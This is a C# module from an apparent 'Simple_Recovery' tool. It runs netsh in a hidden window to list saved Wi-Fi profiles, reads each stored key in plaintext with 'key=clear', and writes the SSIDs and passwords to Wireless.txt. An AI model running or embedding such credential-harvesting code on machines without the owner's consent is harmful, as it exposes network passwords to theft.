using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Simple_Recovery.Modules
{
    public static class Wifi
    {
        // Get a list of saved profiles
        
        private static IEnumerable<string> GetProfiles()
        {
            var profileList = new List<string>();

            var ready = false;
            
            // Create a process to get the wlan profiles
            
            using (var process = new Process())
            {
                string output;
                
                // Set the specifications for the process
                
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = "wlan show profiles";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                // Start the process
                
                process.Start();

                while ((output = process.StandardOutput.ReadLine()) != null)
                {
                    if (ready)
                    {
                        // Remove blank characters from string
                        
                        var removeSpaces = output.Replace(" ", string.Empty);

                        // Format the string to get the SSID
                        
                        var formattedString = removeSpaces.Substring(removeSpaces.IndexOf(":", StringComparison.Ordinal) + 1);

                        if (formattedString.Length > 3)
                        {
                            profileList.Add(formattedString);    
                        }    
                    }

                    else
                    {
                        if (output.StartsWith("User profiles"))
                        {
                            ready = true;

                            // Skip the next line to begin gathering profiles
                            
                            process.StandardOutput.ReadLine();
                        }
                    }
                }
            }

            return profileList;
        }

        // Get the password from a profile
        
        private static string GetPassword(string profile)
        {
            var password = "";
            
            using (var process = new Process())
            {
                string output;
                
                // Set the specifications for the process
                
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = $"wlan show profiles name=\"{profile}\" key=clear";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                // Start the process
                
                process.Start();

                while ((output = process.StandardOutput.ReadLine()) != null)
                {
                    if (output.Contains("Key Content"))
                    {
                        // Remove blank characters from string
                        
                        var removeSpaces = output.Replace(" ", string.Empty);
                        
                        // Format the string to get the password
                        
                        var formattedString = removeSpaces.Substring(removeSpaces.IndexOf(":", StringComparison.Ordinal) + 1);

                        password = formattedString;
                    }
                }
            }

            return password;
        }

        // Write the SSID and password to a file
        
        public static void WriteToFile(string path)
        {
            var passwords = new StringBuilder();
            
            var profileList = GetProfiles();

            foreach (var profile in profileList)
            {
                passwords.AppendLine($"{profile} : {GetPassword(profile)}");
            }
            
            File.WriteAllText(path + @"\Wireless.txt", passwords.ToString());
        }
    }
}